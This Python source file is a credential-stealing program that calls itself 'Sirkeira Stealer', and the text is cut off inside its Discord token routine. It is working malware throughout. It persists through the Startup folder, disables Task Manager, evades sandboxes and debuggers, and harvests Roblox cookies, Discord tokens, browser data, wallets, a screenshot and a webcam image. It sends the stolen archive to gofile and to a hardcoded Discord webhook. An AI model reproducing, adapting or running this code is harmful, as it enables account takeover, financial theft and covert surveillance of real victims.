import shutil, requests, platform, socket, getpass, psutil, browser_cookie3, os, re, sys, subprocess, ctypes, json, base64, sqlite3, zipfile, random, cv2, time

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from win32crypt import CryptUnprotectData
from Cryptodome.Cipher import AES
from contextlib import suppress
from pathlib import Path


class Paths:
    def __init__(self):
        self.temp = Path(os.environ["TEMP"])
        self.windows = os.environ.get("WINDIR")
        self.userprofile = Path(os.environ["USERPROFILE"])
        self.appdata_local = Path(os.environ["LOCALAPPDATA"])
        self.appdata_roaming = Path(os.environ["APPDATA"])
        
        program_files = os.environ.get("ProgramFiles")
        program_files_x86 = os.environ.get("ProgramFiles(x86)")
        self.program_files = Path(program_files or program_files_x86)
        self.program_files_x86 = Path(program_files_x86)


class Malware:
    def __init__(self):
        self.zip_name = f"SK_{random.randint(10000000000, 99999999999)}.zip"
        self.webhook_url = "https://discord.com/api/webhooks/1536213881377128548/72Q3UN80YoZEKaZr1AqH5tBDOhopcEuNYgM94lDJVSijkCconJ-oLYW3YfpvA0WL1g7c"
        self.stealer_version = "1.5.2"
        self.malware_name = "Sirkeira Stealer"
        self.malware_author = "https://t.me/CirqueiraDev"
        self.browser_infos = ["extentions", "passwords", "cookies", "history", "downloads", "cards"]
        self.session_files = ["Wallets", "Game Launchers", "Apps"]
        self.task_manager_blocked = False
    
    def delete_file(self, file_path):
        try:
            if os.path.isfile(file_path):
                os.remove(file_path)
            elif os.path.isdir(file_path):
                shutil.rmtree(file_path)
        except Exception:
            pass

    def startup_persistence(self):
        try:
            src = os.path.abspath(sys.argv[0])
            dst_dir = os.path.join(Paths().appdata_roaming, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
            dst = os.path.join(dst_dir, os.path.basename(src))

            if not os.path.exists(dst_dir):
                os.makedirs(dst_dir)

            if not os.path.exists(dst):
                shutil.copy2(src, dst)
        except Exception:
            pass

    def block_task_manager(self):
        try:
            key = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
            registry = ctypes.windll.advapi32.RegCreateKeyExW
            hkey = ctypes.c_void_p()
            result = registry(ctypes.c_void_p(0x80000002), key, 0, None, 0, 0xF003F, None, ctypes.byref(hkey), None)
            if result == 0:
                value = ctypes.c_uint32(1)
                ctypes.windll.advapi32.RegSetValueExW(hkey, "DisableTaskMgr", 0, 4, ctypes.byref(value), 4)
                ctypes.windll.advapi32.RegCloseKey(hkey)
        except Exception:
            pass

    def unblock_task_manager(self):
        try:
            key = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
            registry = ctypes.windll.advapi32.RegCreateKeyExW
            hkey = ctypes.c_void_p()
            result = registry(ctypes.c_void_p(0x80000002), key, 0, None, 0, 0xF003F, None, ctypes.byref(hkey), None)
            if result == 0:
                value = ctypes.c_uint32(0)
                ctypes.windll.advapi32.RegSetValueExW(hkey, "DisableTaskMgr", 0, 4, ctypes.byref(value), 4)
                ctypes.windll.advapi32.RegCloseKey(hkey)
        except Exception:
            pass

    def send_webhook(self, gofile_url=None, file_path=None):
        try:
            embed = {
                "title": "• Basic system infos:",
                "color": 0xE53935,
                "fields": [
                    {"name": "Hostname:", "value": f"```{socket.gethostname()}```", "inline": True},
                    {"name": "Username:", "value": f"```{getpass.getuser()}```", "inline": True},
                    {"name": "Machine:", "value": f"```{platform.machine()}```", "inline": True},
                    {"name": "System:", "value": f"```{platform.system()}```", "inline": True},
                    {"name": "Release:", "value": f"```{platform.release()}```", "inline": True},
                    {"name": "Version:", "value": f"```{platform.version()}```", "inline": True},
                ],
                "footer": {
                    "text": "• God's in his heaven. All's right with the world. | @CirqueiraDev"
                }
            }

            components = [
                {
                    "type": 1,
                    "components": [
                        {
                            "type": 2,              
                            "style": 5,                    
                            "label": "Download File",       
                            "url": gofile_url        
                        },
                        {
                            "type": 2,              
                            "style": 5,                    
                            "label": "Github",       
                            "url": "https://github.com/CirqueiraDev"        
                        }
                    ]
                }
            ]

            payload = {
                "username": self.malware_name,
                "embeds": [embed],
                "components": components
            }

            if file_path and os.path.exists(file_path):
                with open(file_path, "rb") as f:
                    files = {"file": (os.path.basename(file_path), f)}
                    requests.post(self.webhook_url + "?with_components=true", data={"payload_json": json.dumps(payload)}, files=files)
            else:
                requests.post(self.webhook_url + "?with_components=true", json=payload)

        except Exception as e:
            print("Erro:", e)

    def upload_gofile(self, file_path):
        try:
            with open(file_path, "rb") as f:
                files = {"file": f}
                response = requests.post(f"https://upload.gofile.io/uploadFile", files=files)
                if response.status_code == 200:
                    result = response.json()
                    if result.get("status") == "ok":
                        return result["data"]["downloadPage"]
            return None
        except Exception as e:
            return None

    def start_stealer(self, zip_file):
        try:
            try:
                interesting_files = StealerFunctions.Interesting_Files(zip_file)
                print("Interesting files collected:", interesting_files)
            except:
                print("Error collecting interesting files.")
            try:
                screenshot_taken = StealerFunctions.Screenshot(zip_file)
                print("Screenshot taken:", screenshot_taken)
            except:
                print("Error taking screenshot.")
            try:
                antivirus_count = StealerFunctions.AntiVirus_Infos(zip_file)
                print("Antivirus infos collected:", antivirus_count)
            except:
                print("Error collecting antivirus infos.")
            try:
                discord_tokens = StealerFunctions.Discord_Tokens(zip_file)
                print("Discord tokens collected:", discord_tokens)
            except:
                print("Error collecting Discord tokens.")
            try:
                roblox_cookies = StealerFunctions.Roblox_Cookies(zip_file)
                print("Roblox cookies collected:", roblox_cookies)
            except:
                print("Error collecting Roblox cookies.")
            try:
                session_files = StealerFunctions.Session_files(zip_file, self.session_files)
                print("Session files collected:", session_files)
            except:
                print("Error collecting session files.")
            try:
                browser_Infos = StealerFunctions.Browser_Infos(zip_file, self.browser_infos)
                print("Browser infos collected:", browser_Infos)
            except:
                print("Error collecting browser infos.")
            try:
                webcam_taken = StealerFunctions.Webcam(zip_file)
                print("Webcam photo taken:", webcam_taken)
            except:
                print("Error taking webcam photo.")
            try:
                system_infos = StealerFunctions.System_Infos(zip_file)
                print("System infos collected:", system_infos)
            except:
                print("Error collecting system infos.")

            return True
        except Exception as e:
            print('Exeption (start_stealer): ', e)
            return False

    def main(self):
        try:
            self.startup_persistence()
           
            if not Checks.is_windows():
                print('not windows os')
                return
            if not Checks.is_connected():
                print('no internet connection')
                return
            if Checks.is_sandboxed():
                print('detected sandbox environment')
                return
            if Checks.is_debugged(): 
                print('detected debugger')
                return
            
            if Checks.is_admin():
                self.block_task_manager()
                self.task_manager_blocked = True

            zip_file_path = os.path.join(Paths().temp, self.zip_name)
            zip_file = zipfile.ZipFile(zip_file_path, "w", zipfile.ZIP_DEFLATED)
            
            sucess = self.start_stealer(zip_file)

            zip_file.close()

            if sucess:
                print("Stealing completed successfully.")
                gofile_url = self.upload_gofile(zip_file_path)
                if gofile_url:
                    self.send_webhook(gofile_url=gofile_url, file_path=None)
                else:
                    self.send_webhook(gofile_url=None, file_path=zip_file_path)

                self.delete_file(zip_file_path)
            else:
                print("Stealing failed.")
            
            if self.task_manager_blocked:
                self.unblock_task_manager()
                self.task_manager_blocked = False
        except Exception:
            pass


class AntiSandbox:
    DLL_INDICATORS = [
        "SbieDll.dll", "VBoxHook.dll", "VBoxSF.dll", "VBoxDisp.dll",
        "vmcheck.dll", "wpespy.dll", "snxhk.dll", "dbghelp.dll", "dbgcore.dll"
    ]

    VM_MAC_PREFIXES = [
        "00:05:69",  # VMware
        "00:0C:29",
        "00:1C:14",
        "00:50:56",
        "08:00:27",  # VirtualBox
    ]

    @staticmethod
    def detect_dlls() -> bool:
        GetModuleHandle = ctypes.windll.kernel32.GetModuleHandleA
        for dll in AntiSandbox.DLL_INDICATORS:
            if GetModuleHandle(dll.encode()) != 0:
                return True
        return False

    @staticmethod
    def detect_mac() -> bool:
        try:
            output = subprocess.check_output("getmac", creationflags=0x08000000)
            output = output.decode(errors="ignore")

            macs = re.findall(r"([0-9A-F]{2}(?:-[0-9A-F]{2}){5})", output, re.I)
            macs = [mac.replace("-", ":").lower() for mac in macs]

            for mac in macs:
                if any(mac.startswith(prefix.lower()) for prefix in AntiSandbox.VM_MAC_PREFIXES):
                    return True
        except:
            pass
        return False

    @staticmethod
    def detect_hardware() -> bool:
        try:
            class MEMORYSTATUS(ctypes.Structure):
                _fields_ = [
                    ('dwLength', ctypes.c_ulong),
                    ('dwMemoryLoad', ctypes.c_ulong),
                    ('ullTotalPhys', ctypes.c_ulonglong),
                    ('ullAvailPhys', ctypes.c_ulonglong),
                    ('ullTotalPageFile', ctypes.c_ulonglong),
                    ('ullAvailPageFile', ctypes.c_ulonglong),
                    ('ullTotalVirtual', ctypes.c_ulonglong),
                    ('ullAvailVirtual', ctypes.c_ulonglong),
                    ('sullAvailExtendedVirtual', ctypes.c_ulonglong),
                ]

            mem = MEMORYSTATUS()
            mem.dwLength = ctypes.sizeof(mem)
            ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(mem))

            ram_gb = mem.ullTotalPhys / (1024**3)

            cpu_count = os.cpu_count()

            return ram_gb < 3 or cpu_count <= 2

        except:
            return False

    @staticmethod
    def detect_boot_time() -> bool:
        try:
            uptime = time.time() - psutil.boot_time()
            return uptime < 60
        except:
            return False

    @staticmethod
    def detect_wine() -> bool:
        return os.path.exists("C:\\windows\\system32\\wineboot.exe")


class Checks:
    @staticmethod
    def is_connected() -> bool:
        try:
            requests.get("https://www.google.com", timeout=5)
            return True
        except (requests.ConnectionError, requests.Timeout):
            return False
    
    @staticmethod
    def is_windows() -> bool:
        return platform.system().lower() == "windows"
    
    @staticmethod
    def is_admin() -> bool:
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    @staticmethod
    def is_sandboxed() -> bool:
        checks = [
            AntiSandbox.detect_mac(),
            AntiSandbox.detect_dlls(),
            AntiSandbox.detect_wine(),
            AntiSandbox.detect_hardware(),
            AntiSandbox.detect_boot_time()
        ]
        return any(checks)

    @staticmethod
    def is_debugged() -> bool:
        blacklist_programs = ['cheatengine', 'cheat engine', 'x32dbg', 'x64dbg', 'ollydbg', 'windbg', 'ida', 'ida64', 'ghidra', 'radare2', 'radare', 'dbg', 'immunitydbg', 'dnspy', 'softice', 'edb', 'debugger', 'visual studio debugger', 'lldb', 'gdb', 'valgrind', 'hex-rays', 'disassembler', 'tracer', 'debugview', 'procdump', 'strace', 'ltrace', 'drmemory', 'decompiler', 'hopper', 'binary ninja', 'bochs', 'vdb', 'frida', 'api monitor', 'process hacker', 'sysinternals', 'procexp', 'process explorer', 'monitor tool', 'vmmap', 'xperf', 'perfview', 'py-spy', 'strace-log', "vboxservice", "vboxtray", "vmtoolsd", "vmwaretray", "vmwareuser", "wireshark", "procmon"]
        try:
            for proc in psutil.process_iter(['name']):
                try:
                    name = proc.info['name'].lower()
                    if any(x in name for x in blacklist_programs):
                        return True
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
        except Exception:
            pass

        return False


class StealerFunctions:
    @staticmethod
    def System_Infos(zip_file):
        info = False
        space = ' '

        def info():
            ip_info = ''
            with suppress(Exception):
                eva = requests.get("https://ipwhois.app/json/").json()
                for i in eva:
                    len_i = len(i)
                    pad = 20-len_i
                    ip_info += f"    - {i}{space*pad}: {eva[i]}\n"
                return ip_info
            return '''No IP infos.'''

        try: 
            IPinfos = info()

            cpu_count = psutil.cpu_count(logical=True)
            ram_total = round(psutil.virtual_memory().total / (1024**3), 2)
            disk_usage = psutil.disk_usage('/').percent

            net_info = ''
            with suppress(Exception):
                interfaces = psutil.net_if_addrs()
                max_len = max(len(i) for i in interfaces)

                for iface, addr_list in interfaces.items():
                    for addr in addr_list:
                        if addr.family == socket.AF_INET:
                            pad = max_len - len(iface)
                            net_info += f"    - {iface}{space * pad} : {addr.address}\n"

            system_infos = f"""
System infos:
    - hostname      : {socket.gethostname()}
    - username      : {getpass.getuser()}
    - processor     : {platform.processor()}
    - machine       : {platform.machine()}
    - platform      : {platform.platform()}
    - system        : {platform.system()}
    - release       : {platform.release()}
    - version       : {platform.version()}
    - CPU cores     : {cpu_count}
    - RAM total(GB) : {ram_total}
    - Disk usage(%) : {disk_usage}
    - local IP      : {socket.gethostbyname(socket.gethostname())}

Network interfaces:
{net_info}
Public IP infos:
{IPinfos}
        """
            info = True
        except:
            info = False
            system_infos = "No infos."
            
        zip_file.writestr(f"system_infos.txt", system_infos)
        return info
    
    @staticmethod
    def Roblox_Cookies(zip_file):
        file_roblox_account = ""
        number_roblox_account = 0
        cookie_list = []

        def GetCookie(cookies):
            try:
                cookie_str = str(cookies)
                if ".ROBLOSECURITY=" in cookie_str:
                    cookie = cookie_str.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
                    return cookie
                return None
            except:
                return None

        browsers = [
            browser_cookie3.edge,
            browser_cookie3.chrome,
            browser_cookie3.opera,
            browser_cookie3.firefox,
            browser_cookie3.opera_gx,
            browser_cookie3.brave
        ]

        for browser_func in browsers:
            try:
                cookies = browser_func(domain_name=".roblox.com")
                cookie = GetCookie(cookies)
                if cookie and cookie not in cookie_list:
                    cookie_list.append(cookie)
                    number_roblox_account += 1

                    try:
                        info = requests.get(
                            "https://users.roblox.com/v1/users/authenticated",
                            cookies={".ROBLOSECURITY": cookie},
                            timeout=10
                        )
                        api = info.json() if info.status_code == 200 else {}
                    except:
                        api = {}

                    user_id = api.get('id', "None")
                    username = api.get('name', "None")
                    display_name = api.get('displayName', "None")

                    file_roblox_account += f"""Roblox Account n°{number_roblox_account}:
- Navigator     : {browser_func.__name__}
    - Id            : {user_id}
    - Username      : {username}
    - DisplayName   : {display_name}
    - Cookie        : {cookie}
                        """
            except Exception:
                continue

        if not cookie_list:
            file_roblox_account = "No roblox cookie found."

        zip_file.writestr(f"Roblox Accounts ({number_roblox_account}).txt", file_roblox_account)
        return number_roblox_account
        
    @staticmethod
    def Discord_Tokens(zip_file):
        file_discord_account = ""
        number_discord_account = 0

        def ExtractToken():  
            base_url = "https://discord.com/api/v9/users/@me"
            regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
            regexp_enc = r"dQw4w9WgXcQ:[^\"]*"
            tokens = []
            uids = []
            token_info = {}

            
            path_appdata_local = Paths().appdata_local
            path_appdata_roaming = Paths().appdata_roaming

            paths = [
                ("Discord",                os.path.join(path_appdata_roaming, "discord", "Local Storage", "leveldb"),                                                  ""),
                ("Discord Canary",         os.path.join(path_appdata_roaming, "discordcanary", "Local Storage", "leveldb"),                                            ""),
                ("Lightcord",  
